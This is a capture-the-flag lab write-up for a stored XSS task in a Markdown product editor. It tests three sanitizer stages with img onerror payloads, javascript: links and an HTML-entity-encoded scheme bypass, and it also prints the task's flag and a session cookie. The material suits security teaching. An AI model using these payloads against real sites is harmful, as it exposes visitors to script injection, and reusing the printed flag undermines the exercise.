# Task 4. Stored XSS - Markdown Editor

## **Task 4 Description**


### 4. Stored XSS - Markdown Editor

The product editor lets administrators write product descriptions in Markdown. Markdown becomes HTML. If the sanitizer that converts Markdown to HTML is misconfigured or incomplete, an admin writing a product description can silently compromise every user who views that product page.

#### Stage URLs

| Stage | URL | What Changes |
| :--- | :--- | :--- |
| 1 | `/admin/products/1/edit` | Raw HTML allowed in Markdown |
| 2 | `/admin/products/1/edit/safe` | Sanitizer strips some tags |
| 3 | `/admin/products/1/edit/strict` | Stricter sanitizer |

#### Mission Objectives
1. Write a normal Markdown description and preview it.
2. Try embedding raw HTML does it survive into the rendered preview?
3. Try Markdown link syntax: `[text](/rltoken/huXKTrshGfR1NkvYs3kWPA)` does the URL allow `javascript:` protocol?
4. Compare three views: what you typed, what the preview shows, what DevTools Elements shows.
5. Show C2 evidence from the product preview page.

#### Hints
* **Stage 1:** If raw HTML passes through, your full injection toolkit is available.
* **Stage 2:** Which tags or attributes survive? Test systematically.
* **Stage 3:** The rendered HTML may differ from the Markdown source in unexpected ways. Check Elements carefully.
* Some payloads need user interaction (click a link). Others fire on render.

#### The Sanitizer Problem
Sanitizers are library code. They are only as good as their configuration. Common failures:
* Allowing `href="javascript:..."` in links
* Permitting `data:` URIs in images
* Not stripping event attributes from allowed tags
* Normalizing HTML in ways that reconstruct dangerous patterns

#### Verification Checklist
- [ ] You can explain the Markdown-to-HTML transformation at each stage
- [ ] You identified which sanitizer behavior was insufficient
- [ ] C2 shows evidence from the rendered product preview
- [ ] Stage 3 returns the flag

#### Repo:
* **GitHub repository:** `dlh-cyber_security`
* **Directory:** `web_application_security/websec_0x0C`
* **File:** `5-flag.txt`





## **Solution**



- Start sandbox `cyber_websec_0x0c`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.213.180 web0x0c.hbtn" | sudo tee -a /etc/hosts
```




Our progression will be Stage 1 (raw HTML), Stage 2 (partial sanitization), and Stage 3 (strict sanitization and flag capture).

## Step 1: Establish the Markdown rendering baseline

Objective: Confirm that the editor converts Markdown into HTML before investigating possible XSS vulnerabilities.


1. Open Firefox on Kali and navigate to:

   `http://web0x0c.hbtn/admin/products/1/edit`
2. Find the product description Markdown editor.
3. Enter this harmless Markdown:
   ```
   **MARKDOWN_STAGE1_TEST**
   ```
4. Click "Update Description" to save the Markdown.

Check ✅: The "Live Preview" shows **MARKDOWN_STAGE1_TEST** in bold, without the literal `**` characters.

Stage 1 converts Markdown into rendered HTML, and Update Description saves the content.

## Step 2: Test raw HTML injection in Stage 1

Objective: Determine whether the Markdown renderer allows raw HTML elements or sanitizes them.

On:

`http://web0x0c.hbtn/admin/products/1/edit`

Replace the Markdown description with:

```
<b id="stage1-html-probe">STAGE1_HTML_OK</b>
```

Click Update Description, then reload the page.

Outcome:

1. Live Preview: The **`STAGE1_HTML_OK`** appears in bold, therea are no literal HTML tags displayed.
2. DevTools → Inspector: Search for `stage1-html-probe`:
```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<b id="stage1-html-probe">STAGE1_HTML_OK</b>
		</p>
	</div>
</div>
```

Stage 1 allows raw HTML through the Markdown renderer.

The Inspector reveals an important detail:

```html
<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
```

This suggests the backend converts Markdown to HTML and marks the resulting HTML as trusted using `|safe`, bypassing Jinja2's automatic HTML escaping.

We have confirmed HTML injection. Next, we'll test JavaScript execution.

## Step 3: Confirm stored XSS in Stage 1

Objective: Determine whether the Markdown renderer preserves executable HTML event handlers.

On:

`http://web0x0c.hbtn/admin/products/1/edit`

Replace the Markdown description with:

```
<img src=x onerror="console.log('MARKDOWN_STAGE1_XSS_EXECUTED')">
```

Click Update Description, open Firefox DevTools → Console, and reload the page.

Expected Console output:

```
MARKDOWN_STAGE1_XSS_EXECUTED
```

The invalid image source triggers the `error` event, executing JavaScript through the `onerror` attribute.

Outcome:

1. The `MARKDOWN_STAGE1_XSS_EXECUTED` appears in the Console.
2. The Inspector shows an actual `<img>` element with its `onerror` attribute intact.
```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
    <!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
    <div class="prose prose-invert prose-sm max-w-none">
        <p><img src="x" onerror="console.log('MARKDOWN_STAGE1_XSS_EXECUTED')"></p>
    </div>
</div>
```


Stage 1 stored XSS is confirmed. The Markdown renderer preserves raw HTML, including executable event handlers. The payload survives saving and executes again after reloading.



## Step 4: Investigate Stage 2 sanitization

Objective: Determine whether Stage 2 removes `<script>` elements while still allowing JavaScript execution through HTML event handlers.

Navigate to:

`http://web0x0c.hbtn/admin/products/1/edit/safe`

Replace the Markdown description with:

```
<script>console.log('STAGE2_SCRIPT_EXECUTED')</script>
<img src=x onerror="console.log('MARKDOWN_STAGE2_XSS_EXECUTED')">
```

Click Update Description, then reload with Firefox DevTools open.

Observations:

1. Console:
    - `MARKDOWN_STAGE2_XSS_EXECUTED` displayed.
    - `STAGE2_SCRIPT_EXECUTED` does not appear.
2. Inspector: The rendered HTML containing the payload:
    - The `<script>` element is html escaped.
    - The `<img>` element retains its `onerror` attribute.
```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
    <!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
    <div class="prose prose-invert prose-sm max-w-none">
        &lt;script&gt;console.log('STAGE2_SCRIPT_EXECUTED')&lt;/script&gt;
        <p><img src="x" onerror="console.log('MARKDOWN_STAGE2_XSS_EXECUTED')"></p>
    </div>
</div>
```

Stage 2 stored XSS is confirmed. The sanitizer prevents `<script>` from becoming executable HTML but leaves the `<img onerror>` handler intact.

The `<script>` element was HTML-escaped, not removed. The sanitizer's failure is that it inconsistently handles potentially executable HTML.

## Step 5: Test the Stage 3 strict sanitizer

Objective: Determine whether Stage 3 blocks the event-handler technique that succeeded in Stages 1 and 2.

Navigate to:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the Markdown description with:

```
<img src=x onerror="console.log('MARKDOWN_STAGE3_XSS_EXECUTED')">
```

Click Update Description, then reload the page with Firefox DevTools open.

Observations:

1. Console: Does **not** display `MARKDOWN_STAGE3_XSS_EXECUTED` message.
2. Inspector: Copy/paste from the inspector the rendered HTML in the Live Preview:
```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
    <!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
    <div class="prose prose-invert prose-sm max-w-none">
        <p>&lt;img src=x onerror="console.log('MARKDOWN_STAGE3_XSS_EXECUTED')"&gt;</p>
    </div>
</div>
```
- the `<img>` element is HTML-escaped, so the `onerror` attribute is not executed.



Stage 3 successfully blocks our `<img onerror>` payload, but we haven't established whether its Markdown link handling is secure.

The Inspector confirms that the payload is rendered as text:

```html
<p>&lt;img src=x onerror="console.log('MARKDOWN_STAGE3_XSS_EXECUTED')"&gt;</p>
```

## Step 6: Test Markdown link protocol handling

Objective: Determine whether the Stage 3 Markdown renderer accepts the `javascript:` URL scheme in Markdown links.

Stay on:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the Markdown description with:

```
[STAGE3_LINK_TEST](javascript:console.log('MARKDOWN_STAGE3_LINK_EXECUTED'))
```

Click Update Description, then reload.

Observations:

1. The Markdown editor has the html escape of `<p><a>STAGE3_LINK_TEST</a></p>`.
```html
<form method="POST" action="/admin/products/1/edit/strict">
	<textarea name="description" rows="12" placeholder="Write your product description in Markdown...

# Heading
**Bold text**
*Italic text*
[Link](url)
![Image](url)" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 font-mono text-sm focus:outline-none focus:border-nexus-500 transition-colors resize-none">&lt;p&gt;&lt;a&gt;STAGE3_LINK_TEST&lt;/a&gt;&lt;/p&gt;</textarea>
	<div class="flex justify-between items-center mt-4">
		<p class="text-xs text-zinc-500">Supports Markdown syntax</p>
		<button type="submit" class="bg-nexus-600 hover:bg-nexus-700 px-6 py-2.5 rounded-lg font-medium transition-colors">
                            Update Description
                        </button>
	</div>
</form>
```
2. The Live Preview displays `STAGE3_LINK_TEST`, while keeping the `<p>` and `<a>` elements.

```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<a>STAGE3_LINK_TEST</a>
		</p>
	</div>
</div>
```

Stage 3 blocks the `javascript:` URL scheme in our Markdown link. The sanitizer retains the `<a>` element but removes its `href` attribute.

The Inspector shows:

```html
<p>
    <a>STAGE3_LINK_TEST</a>
</p>
```

This is important because the Markdown renderer still generates HTML, but the sanitizer selectively removes attributes it considers dangerous.

Another interesting observation: after saving, the editor contains escaped generated HTML (`&lt;p&gt;&lt;a&gt;...`) rather than the original Markdown. This suggests the application may store or reprocess the transformed description.

## Step 7: Test whether ordinary links retain their URLs

Objective: Determine whether Stage 3 removes all `href` attributes or specifically blocks dangerous URL schemes such as `javascript:`.

Stay on:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the entire Markdown description with:

```
[STAGE3_SAFE_LINK](https://example.com)
```

Click Update Description, then reload.

Open Firefox DevTools → Inspector and search for `STAGE3_SAFE_LINK`.

We want to distinguish between these possibilities:

| Result                           | Interpretation                                                 |
| -------------------------------- | -------------------------------------------------------------- |
| `<a href="https://example.com">` | Safe URL schemes are permitted                                 |
| `<a>STAGE3_SAFE_LINK</a>`        | All URLs may be stripped                                       |
| Literal Markdown or escaped HTML | The rendering pipeline is transforming the content differently |

If HTTPS links survive while `javascript:` links do not, we'll investigate the sanitizer's URL handling more closely.

We got a clickable link in the Live Preview. The Inspector shows the Live Preview HTML:

```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<a href="https://example.com">STAGE3_SAFE_LINK</a>
		</p>
	</div>
</div>
```

Stage 3 preserves ordinary HTTPS links while removing `javascript:` URLs.

We now know the sanitizer is protocol-aware, rather than simply stripping every `href` attribute.

## Step 8: Test HTML entity decoding in Markdown URLs

Objective: Determine whether HTML character references can bypass the URL scheme filter.

Instead of writing `javascript:` directly, we'll encode the letter `s` as the HTML numeric character reference `&#x73;`.

On:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the Markdown description with:

```
[STAGE3_ENTITY_LINK](java&#x73;cript:console.log('STAGE3_ENTITY_EXECUTED'))
```

Click Update Description, then reload.


Observations:

1. In the Markdown editor we have:
```html
<textarea name="description" rows="12" placeholder="Write your product description in Markdown...
# Heading
**Bold text**
*Italic text*
[Link](url)
![Image](url)" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 font-mono text-sm focus:outline-none focus:border-nexus-500 transition-colors resize-none">
    &lt;p&gt;&lt;a title="STAGE3_ENTITY_EXECUTED"&gt;STAGE3_ENTITY_LINK&lt;/a&gt;)&lt;/p&gt;
</textarea>
```
2. In the Live Preview we have:
```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<a title="STAGE3_ENTITY_EXECUTED">STAGE3_ENTITY_LINK</a>)</p>
	</div>
</div>
```

The encoded `javascript:` attempt did not produce an executable link.

The Inspector shows:

```
<p>
    <a title="STAGE3_ENTITY_EXECUTED">STAGE3_ENTITY_LINK</a>)
</p>
```

Two important findings:

- The `<a>` element has no `href` attribute, so the dangerous URL did not survive.
- The unexpected `title` attribute and trailing `)` suggest that the Markdown parser interpreted parts of our payload differently than intended.

We should isolate the URL encoding behavior from the complications introduced by `console.log(...)`.

## Step 9: Test a minimal HTML-entity-encoded URL

Objective: Determine whether the sanitizer recognizes a `javascript:` scheme when part of the scheme is HTML-entity-encoded.

Stay on:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the entire Markdown description with:

```
[STAGE3_ENTITY_SIMPLE](java&#x73;cript:1)
```

Click Update Description, then reload the page.

Open Firefox DevTools → Inspector, search for `STAGE3_ENTITY_SIMPLE`, and copy the resulting `<a>` element.

Observation in the Inspector Live Preview HTML:

```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<a href="javascript:1">STAGE3_ENTITY_SIMPLE</a>
		</p>
	</div>
</div>
```


Excellent. We've found a potential Stage 3 sanitizer bypass.

The generated HTML contains:

```
<a href="javascript:1">STAGE3_ENTITY_SIMPLE</a>
```

This is significant because:

- `javascript:1` was rejected when written directly.
- `java&#x73;cript:1` survived and became `href="javascript:1"`.
- The sanitizer appears to validate the URL before HTML entity decoding, or otherwise fails to validate its decoded form.

This suggests a canonicalization vulnerability, where the sanitizer and HTML parser interpret the same input differently.

## Step 10: Confirm JavaScript execution through the encoded Markdown link

Objective: Establish whether clicking the surviving `javascript:` link actually executes JavaScript.

On:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the entire Markdown description with:

```
[STAGE3_XSS_PROOF](java&#x73;cript:console.log%28%27STAGE3_ENTITY_XSS_EXECUTED%27%29)
```

The `%28`, `%29`, and `%27` represent parentheses and single quotation marks. This avoids the Markdown parsing ambiguity encountered earlier.

Click Update Description, reload, then open the Firefox Console and click `STAGE3_XSS_PROOF` in the Live Preview.

Expected result:

```
STAGE3_ENTITY_XSS_EXECUTED
```

Observations:

1. The Console does **not** display `STAGE3_ENTITY_XSS_EXECUTED` and no error messages appear.
2. The Inspector shows the Live Preview HTML:
```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<a>STAGE3_XSS_PROOF</a>
		</p>
	</div>
</div>
```


The previous payload did not execute because the generated `<a>` element had no `href` attribute. The sanitizer removed the URL before the browser could execute it.

However, our earlier test with `java&#x73;cript:1` successfully produced `href="javascript:1"`. That bypass is still promising.

The next experiment should avoid parentheses, quotes, and percent-encoding entirely.

## Step 11: Test JavaScript execution using a simple assignment

Objective: Verify whether an entity-encoded `javascript:` URL can execute JavaScript without triggering the additional filtering observed in Step 10.

On:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Replace the Markdown description with:

```
[STAGE3_TITLE_TEST](java&#x73;cript:document.title=1337)
```

Click Update Description, then reload.

1. Open Firefox DevTools → Inspector and find `STAGE3_TITLE_TEST`.
2. If the `<a>` element has an `href`, click the link in the Live Preview.
3. Check whether the browser tab's title changes to `1337`.

Observations:

```html
<div class="bg-zinc-800 rounded-lg p-4 min-h-[200px]">
	<!-- VULNERABLE: description contains markdown-converted HTML rendered with |safe -->
	<div class="prose prose-invert prose-sm max-w-none">
		<p>
			<a>STAGE3_TITLE_TEST</a>
		</p>
	</div>
</div>
```

. . .


. . .


. . .




## Step 27: Identify the URL filter's acceptance pattern

Let's test several minimal expressions in a single experiment.

On `http://web0x0c.hbtn/admin/products/1/edit/strict`, replace the description with:

```
[TEST_NUMBER](javascript:2)

[TEST_HEX](javascript:0x10)

[TEST_BOOLEAN](javascript:true)

[TEST_OPERATOR](javascript:1-1)

[TEST_PERCENT](javascript:%31)
```

Click Update Description once, then reload.

Open Firefox DevTools → Inspector and copy the rendered HTML containing these five links.

Don't click the links.

We're testing whether the filter allows numeric literals, JavaScript keywords, operators, or percent-encoded characters. This should help distinguish a restricted URL pattern from a more general sanitizer flaw.

The five rendered `<a>` elements are:

```html
<div class="prose prose-invert prose-sm max-w-none">
    <p><a href="javascript:2">TEST_NUMBER</a></p>
    <p><a>TEST_HEX</a></p>
    <p><a>TEST_BOOLEAN</a></p>
    <p><a>TEST_OPERATOR</a></p>
    <p><a>TEST_PERCENT</a></p>
</div>
```

We have a clear pattern in Stage 3's URL filtering.

| Payload           | `href` preserved? |
| ----------------- | ----------------- |
| `javascript:1`    | Yes               |
| `javascript:2`    | Yes               |
| `javascript:0x10` | No                |
| `javascript:true` | No                |
| `javascript:1-1`  | No                |
| `javascript:%31`  | No                |

Conclusion: The sanitizer inconsistently handles `javascript:` URLs, but we haven't demonstrated an exploitable JavaScript expression in Stage 3.

<BR>

. . .


> **We've spent considerable effort characterizing this filter. Let's now investigate the flag-capture mechanism, using what we learned from Tasks 2 and 3.**

<BR>

---


## Step 28: Identify the Task 4 tracking endpoint

In previous tasks:

- Task 2 used `/product/reviews/api/track` with Level 4.
- Task 3 used `/profile/api/track` with Level 5.
- Task 4 likely corresponds to Level 6, although we haven't confirmed yet.

A plausible tracking endpoint is `/admin/products/api/track`.

Executing this command on Kali:

```bash
curl -i 'http://web0x0c.hbtn/admin/products/api/track?t=test'
# HTTP/1.1 200 OK
# Server: nginx
# Date: Sun, 01 Nov 2026 08:57:15 GMT
# Content-Type: application/json
# Content-Length: 19
# Connection: keep-alive
# Vary: Cookie
# Set-Cookie: session=eyJmbGFncyI6W10sInNlc3Npb25faWQiOiJXcndSbnl4Qmx6MWRQTGxFdjBHcDVZUVQ0WjBNSFlfaUpsbDlFaXFhSDhrIn0.aub-6w.PjSt8KCEHmsxFmDVMwI41RKFoU0; HttpOnly; Path=/; SameSite=Lax

# {"status":"error"}```
```


- Tracking endpoint: `/admin/products/api/track`, returns HTTP `200` with `{"status":"error"}` for an invalid token.

One important detail: your `curl` request did not include the Firefox session cookie. The response therefore created a separate session, as indicated by the `Set-Cookie` header.



We should test the tracking endpoint using the same browser session that contains `level_6_stage: 3`.

## Step 29: Test Stage 3 token submission

Open Firefox at:

`http://web0x0c.hbtn/admin/products/1/edit/strict`

Open DevTools → Console and execute this javascript snippet:

```javascript
(async () => {
    const token = document.getElementById('tracking-id')?.textContent.trim();

    console.log('TOKEN_FOUND:', Boolean(token));

    if (!token) return;

    const response = await fetch(
        '/admin/products/api/track?t=' + encodeURIComponent(token)
    );

    console.log('TRACK_STATUS:', response.status);
    console.log('TRACK_RESPONSE:', await response.text());
})().catch(console.error);
```

This reads the tracking token already present in the page and submits it using Firefox's existing session.

The important Console results are: `TOKEN_FOUND`, `TRACK_STATUS`, and `TRACK_RESPONSE`.

This is a diagnostic test, not a stored XSS exploit. If it returns the flag, we'll have established how the callback works, but we'll still need to demonstrate the Stage 3 XSS path and C2 evidence to complete the vulnerability verification checklist.

Outcome:

```javascript

TOKEN_FOUND: true

XHR GET
http://web0x0c.hbtn/admin/products/api/track?t=9ICl8ZvFFrj0uciMdTpFZA
[HTTP/1.1 200 OK 68ms]

TRACK_STATUS: 200
TRACK_RESPONSE: {"ref":"FLAG{d4b938b857e1527252b213ae3ba6f364}","status":"tracked"}
```


> **Task 4 flag captured**

The tracking endpoint accepted the token and returned:

```json
{
  "ref": "FLAG{d4b938b857e1527252b213ae3ba6f364}",
  "status": "tracked"
}
```

We've confirmed:

- Level: 6
- Stage: 3
- Tracking endpoint: `/admin/products/api/track`
- Result: `tracked`

We obtained the flag through a direct Console request, not through a Stage 3 stored XSS payload. We still haven't demonstrated a Stage 3 sanitizer bypass that executes JavaScript or generates C2 evidence.

## Step 30: Save the flag and Verify the repository

```bash
echo 'd4b938b857e1527252b213ae3ba6f364' > 5-flag.txt
git add .
git commit -m "5-flag.txt"
git push
```

Afterward, we'll continue the Stage 3 investigation to establish the missing XSS and C2 evidence, so the final report can distinguish the confirmed vulnerabilities from the direct flag retrieval.
